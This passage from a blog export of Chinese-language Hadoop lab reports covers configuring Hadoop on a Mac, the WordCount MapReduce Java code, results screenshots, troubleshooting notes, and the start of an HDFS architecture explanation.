<h2 id="äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ"><a href="#äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ" class="headerlink" title="äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ"></a>äºŒã€å®éªŒä»£ç åŠå‘½ä»¤åˆ†æ</h2><h3 id="åœ¨Macä¸Šé…ç½®hadoopç¯å¢ƒ"><a href="#åœ¨Macä¸Šé…ç½®hadoopç¯å¢ƒ" class="headerlink" title="åœ¨Macä¸Šé…ç½®hadoopç¯å¢ƒ"></a>åœ¨Macä¸Šé…ç½®hadoopç¯å¢ƒ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å°†hadoop102é‡Œçš„hadoopæ‰“åŒ…å¤åˆ¶åˆ°macä¸‹</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/module/</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ‰“åŒ…</span></span><br><span class="line">[huang@hadoop102 module]$ tar -zcvf hadoop-3.1.3.tar.gz /opt/module/hadoop-3.1.3/</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¤åˆ¶</span></span><br><span class="line">[huang@hadoop102 module]$ scp hadoop-3.1.3.tar.gz huangmingwang@10.211.55.2:/Users/huangmingwang/Documents/Hadoop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % sudo vi .bash_profile </span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop</span></span><br><span class="line">export HADOOP_HOME=/Users/huangmingwang/Documents/Hadoop/hadoop-3.1.3 </span><br><span class="line">export HADOOP_USER_NAME=huang</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®©é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % source .bash_profile</span><br></pre></td></tr></table></figure>



<h3 id="æœ¬åœ°æµ‹è¯•WordCount"><a href="#æœ¬åœ°æµ‹è¯•WordCount" class="headerlink" title="æœ¬åœ°æµ‹è¯•WordCount"></a>æœ¬åœ°æµ‹è¯•WordCount</h3><p>WordCountDriver.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountDriver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 è·å–job</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">conf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(conf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 è®¾ç½®jaråŒ…è·¯å¾„</span></span><br><span class="line">        job.setJarByClass(WordCountDriver.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 å…³è”mapperå’Œreducer</span></span><br><span class="line">        job.setMapperClass(WordCountMapper.class);</span><br><span class="line">        job.setReducerClass(WordCountReducer.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4 è®¾ç½®mapè¾“å‡ºçš„kvç±»å‹</span></span><br><span class="line">        job.setMapOutputKeyClass(Text.class);</span><br><span class="line">        job.setMapOutputValueClass(IntWritable.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5 è®¾ç½®æœ€ç»ˆè¾“å‡ºçš„kVç±»å‹</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6 è®¾ç½®è¾“å…¥è·¯å¾„å’Œè¾“å‡ºè·¯å¾„</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/Users/huangmingwang/Documents/input&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/Users/huangmingwang/Documents/output&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 7 æäº¤job</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.exit(result ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WordCountMapper.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.LongWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KEYIN, mapé˜¶æ®µè¾“å…¥çš„keyçš„ç±»å‹ï¼šLongWritable</span></span><br><span class="line"><span class="comment"> * VALUEIN,mapé˜¶æ®µè¾“å…¥valueç±»å‹ï¼šText</span></span><br><span class="line"><span class="comment"> * KEYOUT,mapé˜¶æ®µè¾“å‡ºçš„Keyç±»å‹ï¼šText</span></span><br><span class="line"><span class="comment"> * VALUEOUT,mapé˜¶æ®µè¾“å‡ºçš„valueç±»å‹ï¼šIntWritable</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, Text, IntWritable&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Text</span> <span class="variable">outK</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">IntWritable</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1 è·å–ä¸€è¡Œ</span></span><br><span class="line">        <span class="comment">// atguigu atguigu</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2 åˆ‡å‰²</span></span><br><span class="line">        <span class="comment">// atguigu</span></span><br><span class="line">        <span class="comment">// atguigu</span></span><br><span class="line">        String[] words = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3 å¾ªç¯å†™å‡º</span></span><br><span class="line">        <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">            <span class="comment">// å°è£…outk</span></span><br><span class="line">            outK.set(word);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å†™å‡º</span></span><br><span class="line">            context.write(outK, outV);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WordCountReducer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KEYIN, reduceé˜¶æ®µè¾“å…¥çš„keyçš„ç±»å‹ï¼šText</span></span><br><span class="line"><span class="comment"> * VALUEIN,reduceé˜¶æ®µè¾“å…¥valueç±»å‹ï¼šIntWritable</span></span><br><span class="line"><span class="comment"> * KEYOUT,reduceé˜¶æ®µè¾“å‡ºçš„Keyç±»å‹ï¼šText</span></span><br><span class="line"><span class="comment"> * VALUEOUT,reduceé˜¶æ®µè¾“å‡ºçš„valueç±»å‹ï¼šIntWritable</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WordCountReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, IntWritable,Text,IntWritable&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">IntWritable</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntWritable</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// atguigu, (1,1)</span></span><br><span class="line">        <span class="comment">// ç´¯åŠ </span></span><br><span class="line">        <span class="keyword">for</span> (IntWritable value : values) &#123;</span><br><span class="line">            sum += value.get();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        outV.set(sum);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å†™å‡º</span></span><br><span class="line">        context.write(key,outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Hadoopé›†ç¾¤æµ‹è¯•WordCount"><a href="#Hadoopé›†ç¾¤æµ‹è¯•WordCount" class="headerlink" title="Hadoopé›†ç¾¤æµ‹è¯•WordCount"></a>Hadoopé›†ç¾¤æµ‹è¯•WordCount</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">åˆ›å»ºæ–‡ä»¶å¤¹input</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % hadoop fs -mkdir /input</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å°†word.txtä¸Šä¼ åˆ°hdfsä¸­</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % hadoop fs -put /Users/huangmingwang/Documents/input/word.txt /input </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿è¡Œwordcountç¨‹åº</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br></pre></td></tr></table></figure>





<h2 id="ä¸‰ã€å®éªŒç»“æœ"><a href="#ä¸‰ã€å®éªŒç»“æœ" class="headerlink" title="ä¸‰ã€å®éªŒç»“æœ"></a>ä¸‰ã€å®éªŒç»“æœ</h2><h3 id="åœ¨Macä¸Šé…ç½®hadoopç¯å¢ƒç»“æœ"><a href="#åœ¨Macä¸Šé…ç½®hadoopç¯å¢ƒç»“æœ" class="headerlink" title="åœ¨Macä¸Šé…ç½®hadoopç¯å¢ƒç»“æœ"></a>åœ¨Macä¸Šé…ç½®hadoopç¯å¢ƒç»“æœ</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110274.png" alt="æˆªå±2021-06-30 ä¸‹åˆ7.42.02"></p>
<h3 id="æœ¬åœ°æµ‹è¯•ç»“æœ"><a href="#æœ¬åœ°æµ‹è¯•ç»“æœ" class="headerlink" title="æœ¬åœ°æµ‹è¯•ç»“æœ"></a>æœ¬åœ°æµ‹è¯•ç»“æœ</h3><p>æ‰§è¡Œæœ¬åœ°wordcountç¨‹åºæˆåŠŸï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110276.png" alt="æˆªå±2021-07-01 ä¸Šåˆ9.16.23"></p>
<p>ç¨‹åºè¾“å‡ºç»“æœå±•ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110277.png" alt="æˆªå±2021-07-01 ä¸Šåˆ9.18.17"></p>
<h3 id="Hadoopé›†ç¾¤æ‰§è¡Œwordcountç»“æœ"><a href="#Hadoopé›†ç¾¤æ‰§è¡Œwordcountç»“æœ" class="headerlink" title="Hadoopé›†ç¾¤æ‰§è¡Œwordcountç»“æœ"></a>Hadoopé›†ç¾¤æ‰§è¡Œwordcountç»“æœ</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110278.png" alt="image-20210701104645182"></p>
<p>word.txt:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220108775.png" alt="æˆªå±2021-07-01 ä¸Šåˆ10.47.12 (2)"></p>
<p>ç»“æœï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110279.png" alt="æˆªå±2021-07-01 ä¸Šåˆ10.48.00 (2)"></p>
<p>ä»»åŠ¡å†å²ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220110280.png" alt="æˆªå±2021-07-01 ä¸Šåˆ10.49.52 (2)"></p>
<h2 id="å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•"><a href="#å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•" class="headerlink" title="å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•"></a>å››ã€å®éªŒé‡åˆ°çš„é—®é¢˜åŠè§£å†³æ–¹æ³•</h2><h3 id="åœ¨macä¸Šæ“ä½œhdfsæ—¶æŠ¥é”™"><a href="#åœ¨macä¸Šæ“ä½œhdfsæ—¶æŠ¥é”™" class="headerlink" title="åœ¨macä¸Šæ“ä½œhdfsæ—¶æŠ¥é”™"></a>åœ¨macä¸Šæ“ä½œhdfsæ—¶æŠ¥é”™</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220109737.png" alt="image-20210701100816545"></p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<p>hadoopé›†ç¾¤çš„ç”¨æˆ·æƒé™æ˜¯huangï¼Œåœ¨ç¯å¢ƒå˜é‡è®¾ç½®ä¸ºç”¨æˆ·ä¸ºhuangå³å¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % sudo vi .bash_profile </span><br><span class="line"><span class="meta">#</span><span class="language-bash">hadoop</span></span><br><span class="line">export HADOOP_HOME=/Users/huangmingwang/Documents/Hadoop/hadoop-3.1.3 </span><br><span class="line">export HADOOP_USER_NAME=huang</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin</span><br></pre></td></tr></table></figure>

<h3 id="è¿è¡Œwordcountç¨‹åºæŠ¥é”™"><a href="#è¿è¡Œwordcountç¨‹åºæŠ¥é”™" class="headerlink" title="è¿è¡Œwordcountç¨‹åºæŠ¥é”™"></a>è¿è¡Œwordcountç¨‹åºæŠ¥é”™</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220109339.png" alt="1"></p>
<p>è§£å†³æ–¹æ³•ï¼š</p>
<p>åˆ é™¤æ–‡ä»¶å¤¹outputï¼Œæˆ–è€…å°†è¾“å‡ºæ–‡ä»¶å¤¹æ”¹åï¼›</p>
]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-2 HDFS</title>
    <url>/2021/12/22/%E5%A4%A7%E6%95%B0%E6%8D%AE/Lab-2%20HDFS/</url>
    <content><![CDATA[<h1 id="Lab-2-Hadoop-HDFS-åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»ŸåŸºæœ¬æ“ä½œ"><a href="#Lab-2-Hadoop-HDFS-åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»ŸåŸºæœ¬æ“ä½œ" class="headerlink" title="Lab-2 Hadoop(HDFS)åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»ŸåŸºæœ¬æ“ä½œ"></a>Lab-2 Hadoop(HDFS)åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»ŸåŸºæœ¬æ“ä½œ</h1><h2 id="ä¸€ã€å®éªŒåŸç†åˆ†æ"><a href="#ä¸€ã€å®éªŒåŸç†åˆ†æ" class="headerlink" title="ä¸€ã€å®éªŒåŸç†åˆ†æ"></a>ä¸€ã€å®éªŒåŸç†åˆ†æ</h2><h3 id="HDFSæ˜¯ä»€ä¹ˆ"><a href="#HDFSæ˜¯ä»€ä¹ˆ" class="headerlink" title="HDFSæ˜¯ä»€ä¹ˆ"></a>HDFSæ˜¯ä»€ä¹ˆ</h3><p>HDFSï¼ˆHadoop Distributed File Systemï¼‰ æ˜¯ä¸€ä¸ªé«˜åº¦å®¹é”™æ€§çš„ç³»ç»Ÿï¼Œé€‚åˆéƒ¨ç½²åœ¨å»‰ä»·çš„æœºå™¨ä¸Šã€‚HDFS èƒ½æä¾›é«˜ååé‡çš„æ•°æ®è®¿é—®ï¼Œéå¸¸é€‚åˆå¤§è§„æ¨¡æ•°æ®é›†ä¸Šçš„åº”ç”¨ã€‚HDFS æ”¾å®½äº†ä¸€éƒ¨åˆ† POSIX çº¦æŸï¼Œæ¥å®ç°æµå¼è¯»å–æ–‡ä»¶ç³»ç»Ÿæ•°æ®çš„ç›®çš„ã€‚HDFS åœ¨æœ€å¼€å§‹æ˜¯ä½œä¸º Apache Nutch æœç´¢å¼•æ“é¡¹ç›®çš„åŸºç¡€æ¶æ„è€Œå¼€å‘çš„ã€‚HDFS æ˜¯ Apache Hadoop Core é¡¹ç›®çš„ä¸€éƒ¨åˆ†ã€‚</p>
<h4 id="HDFSä¼˜ç‚¹"><a href="#HDFSä¼˜ç‚¹" class="headerlink" title="HDFSä¼˜ç‚¹"></a>HDFSä¼˜ç‚¹</h4><ul>
<li><p>ä¿å­˜å¤šä¸ªå‰¯æœ¬ï¼Œä¸”æä¾›å®¹é”™æœºåˆ¶ï¼Œå‰¯æœ¬ä¸¢å¤±æˆ–å®•æœºè‡ªåŠ¨æ¢å¤ã€‚é»˜è®¤å­˜3ä»½ã€‚ä¸ºé˜²æ­¢æŸä¸ªä¸»æœºå¤±æ•ˆè¯»å–ä¸åˆ°è¯¥ä¸»æœºçš„å—æ–‡ä»¶ï¼Œå®ƒå°†åŒä¸€ä¸ªæ–‡ä»¶å—å‰¯æœ¬åˆ†é…åˆ°å…¶ä»–æŸå‡ ä¸ªä¸»æœºä¸Šã€‚</p>
</li>
<li><p>è¿è¡Œåœ¨å»‰ä»·çš„æœºå™¨ä¸Šã€‚</p>
</li>
<li><p>é€‚åˆå¤§æ•°æ®çš„å¤„ç†ã€‚HDFSä¼šå°†ä¸€ä¸ªå®Œæ•´çš„å¤§æ–‡ä»¶å¹³å‡åˆ†å—å­˜å‚¨åˆ°ä¸åŒè®¡ç®—æœºä¸Šï¼Œé»˜è®¤ä¼šå°†æ–‡ä»¶åˆ†å‰²æˆblockï¼Œ64Mä¸º1ä¸ªblockã€‚ç„¶åå°†blockæŒ‰é”®å€¼å¯¹å­˜å‚¨åœ¨HDFSä¸Šï¼Œå¹¶å°†é”®å€¼å¯¹çš„æ˜ å°„å­˜åˆ°å†…å­˜ä¸­ã€‚å¦‚æœå°æ–‡ä»¶å¤ªå¤šï¼Œé‚£å†…å­˜çš„è´Ÿæ‹…ä¼šå¾ˆé‡ã€‚</p>
</li>
<li><p>æµå¼æ•°æ®è®¿é—®ï¼Œä¸€æ¬¡å†™å…¥å¤šæ¬¡è¯»å†™ï¼Œå’Œä¼ ç»Ÿæ–‡ä»¶ä¸åŒï¼Œå®ƒä¸æ”¯æŒåŠ¨æ€æ”¹å˜æ–‡ä»¶å†…å®¹ï¼Œè€Œæ˜¯è¦æ±‚è®©æ–‡ä»¶ä¸€æ¬¡å†™å…¥å°±ä¸åšå˜åŒ–ï¼Œè¦å˜åŒ–åªèƒ½åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ </p>
</li>
</ul>
<h4 id="HDFSç¼ºç‚¹"><a href="#HDFSç¼ºç‚¹" class="headerlink" title="HDFSç¼ºç‚¹"></a>HDFSç¼ºç‚¹</h4><ul>
<li><p>ä¸é€‚åˆä½å»¶æ—¶çš„æ•°æ®è®¿é—®ï¼Œæ¯”å¦‚æ¯«ç§’çº§çš„å­˜å‚¨æ•°æ®ï¼Œæ˜¯åšä¸åˆ°çš„</p>
</li>
<li><p>æ— æ³•é«˜æ•ˆçš„å¯¹å¤§é‡å°æ–‡ä»¶è¿›è¡Œå­˜å‚¨</p>
<ul>
<li>å­˜å‚¨å¤§é‡å°æ–‡ä»¶çš„è¯ï¼Œå®ƒä¼šå ç”¨NameNodeå¤§é‡çš„å†…å­˜æ¥å­˜å‚¨æ–‡ä»¶ç›®å½•å’Œå—ä¿¡æ¯ã€‚è¿™æ ·æ˜¯ä¸å¯å–çš„ï¼Œå› ä¸ºNameNodeçš„å†…å­˜æ˜¯æœ‰é™çš„ã€‚</li>
<li>å°æ–‡ä»¶çš„å­˜å‚¨çš„å¯»å€æ—¶é—´ä¼šè¶…è¿‡è¯»å–æ—¶é—´ï¼Œå®ƒè¿åäº†HDFSçš„è®¾è®¡ç›®æ ‡</li>
</ul>
</li>
<li><p>ä¸æ”¯æŒå¹¶å‘å†™å…¥ï¼Œæ–‡ä»¶éšæœºä¿®æ”¹</p>
<ul>
<li>ä¸€ä¸ªæ–‡ä»¶åªèƒ½æœ‰ä¸€ä¸ªå†™ï¼Œä¸å…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶å†™ï¼›</li>
<li>ä»…æ”¯æŒæ•°æ®appendï¼ˆè¿½åŠ ï¼‰ï¼Œä¸æ”¯æŒæ–‡ä»¶çš„éšæœºä¿®æ”¹</li>
</ul>
</li>
</ul>
<h3 id="HDFSæ¶æ„"><a href="#HDFSæ¶æ„" class="headerlink" title="HDFSæ¶æ„"></a>HDFSæ¶æ„</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220103740.png" alt="image-20210628203053925"></p>
<h4 id="HDFS-client"><a href="#HDFS-client" class="headerlink" title="HDFS client"></a>HDFS client</h4><p>æˆ‘ä»¬å’ŒHDFSæ‰“äº¤é“æ˜¯é€šè¿‡ä¸€ä¸ªclient libraryã€‚æ— è®ºæ˜¯è¯»å–ä¸€ä¸ªæ–‡ä»¶è¿˜æ˜¯å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½æ˜¯å…ˆæŠŠæ•°æ®äº¤ç»™HDFS clientï¼Œå®ƒè´Ÿè´£å’ŒName nodesä»¥åŠData nodesè”ç³»å¹¶ä¼ è¾“æ•°æ®ã€‚</p>
<h4 id="NameNode"><a href="#NameNode" class="headerlink" title="NameNode"></a>NameNode</h4><p>åœ¨HDFSä¸­ï¼ŒNamenode ä¿å­˜äº†æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ´»æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„æœºæ„ã€‚å…¶å®å’Œlinuxä¸Šçš„å¾ˆåƒï¼ŒHDFSä¹Ÿæ˜¯æŠŠæ–‡ä»¶å’Œæ–‡ä»¶å¤¹è¡¨ç¤ºä¸ºinodeï¼Œæ¯ä¸ªinodeæœ‰è‡ªå·±çš„æ‰€æœ‰è€…ï¼Œæƒé™ï¼Œåˆ›å»ºçš„ä¿®æ”¹æ—¶é—´ç­‰ç­‰ã€‚HDFSå¯ä»¥å­˜å¾ˆå¤§çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æ¯ä¸ªæ–‡ä»¶è¢«åˆ†ä¸ºä¸€äº›data blockï¼Œå­˜åœ¨ä¸åŒçš„æœºå™¨ä¸Šï¼Œname nodeå°±è´Ÿè´£è®°å½•ä¸€ä¸ªæ–‡ä»¶æœ‰å“ªäº›data blockï¼Œä»¥åŠè¿™äº›data blockåˆ†åˆ«å­˜æ”¾åœ¨é‚£äº›æœºå™¨ä¸Šã€‚</p>
<p>Namenode è¿˜è´Ÿè´£ç®¡ç†æ–‡ä»¶ç³»ç»Ÿå¸¸ç”¨æ“ä½œï¼Œæ¯”å¦‚åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œé‡å‘½åä¸€ä¸ªæ–‡ä»¶ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡å‘½åä¸€ä¸ªæ–‡ä»¶å¤¹ç­‰ã€‚</p>
<p>å½“æˆ‘ä»¬é€šè¿‡HDFS clientå…ˆHDFSè¯»å–æˆ–è€…å†™æ–‡ä»¶æ—¶ï¼Œæ‰€æœ‰çš„éƒ½å†™è¯·æ±‚éƒ½æ˜¯å…ˆå‘ç»™Name nodesï¼Œå®ƒè´Ÿè´£åˆ›å»ºæˆ–è€…æŸ¥è¯¢ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå†è®©HDFS clientå’Œ Data nodesè”ç³»å…·ä½“çš„æ•°æ®ä¼ è¾“ã€‚</p>
<h4 id="DataNode"><a href="#DataNode" class="headerlink" title="DataNode"></a>DataNode</h4><p>å­˜å‚¨data blockçš„æœºå™¨å«åšData nodesã€‚åœ¨è¯»å†™è¿‡ç¨‹ä¸­ï¼ŒData nodesè´Ÿè´£ç›´æ¥æŠŠç”¨æˆ·è¯»å–çš„æ–‡ä»¶blockä¼ ç»™clientï¼Œä¹Ÿè´Ÿè´£ç›´æ¥æ¥å—ç”¨æˆ·å†™çš„æ–‡ä»¶ã€‚</p>
<p>å½“æˆ‘ä»¬è¯»å–ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼š</p>
<ul>
<li>HDFS client è”ç³» Name nodesï¼Œè·å–æ–‡ä»¶çš„ data blocks ç»„æˆã€ä»¥åŠæ¯ä¸ª data block æ‰€åœ¨çš„æœºå™¨ä»¥åŠå…·ä½“å­˜æ”¾ä½ç½®ï¼›</li>
<li>HDFS client è”ç³» Data nodes, è¿›è¡Œå…·ä½“çš„è¯»å†™æ“ä½œï¼›</li>
</ul>
<p>é‡è¦çš„äº‹æƒ…è¯´ä¸‰éã€‚åœ¨è¯»å†™ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå½“æˆ‘ä»¬ä» Name nodes å¾—çŸ¥åº”è¯¥å‘å“ªäº› Data nodes è¯»å†™ä¹‹åï¼Œæˆ‘ä»¬å°±ç›´æ¥å’Œ Data node æ‰“äº¤é“ï¼Œä¸å†é€šè¿‡ Name nodesã€‚</p>
<h4 id="Secondary-NameNode"><a href="#Secondary-NameNode" class="headerlink" title="Secondary NameNode"></a>Secondary NameNode</h4><p>å¹¶éNameNodeçš„çƒ­å¤‡ã€‚å½“NameNodeæŒ‚æ‰çš„æ—¶å€™ï¼Œå®ƒå¹¶ä¸èƒ½é©¬ä¸Šæ›¿æ¢NameNode å¹¶æä¾›æœåŠ¡ã€‚</p>
<p>è¾…åŠ©NameNodeï¼Œåˆ†æ‹…å…¶å·¥ä½œé‡ï¼Œæ¯”å¦‚å®šæœŸåˆå¹¶Fsimageå’ŒEditsï¼Œå¹¶æ¨é€ç»™NameNodeã€‚</p>
<p>åœ¨ç´§æ€¥æƒ…å†µä¸‹ï¼Œå¯è¾…åŠ©æ¢å¤NameNodeã€‚</p>
<h3 id="HDFSæ–‡ä»¶å†™å…¥"><a href="#HDFSæ–‡ä»¶å†™å…¥" class="headerlink" title="HDFSæ–‡ä»¶å†™å…¥"></a>HDFSæ–‡ä»¶å†™å…¥</h3><p>Clientå‘NameNodeå‘èµ·æ–‡ä»¶å†™å…¥çš„è¯·æ±‚ã€‚</p>
<ol>
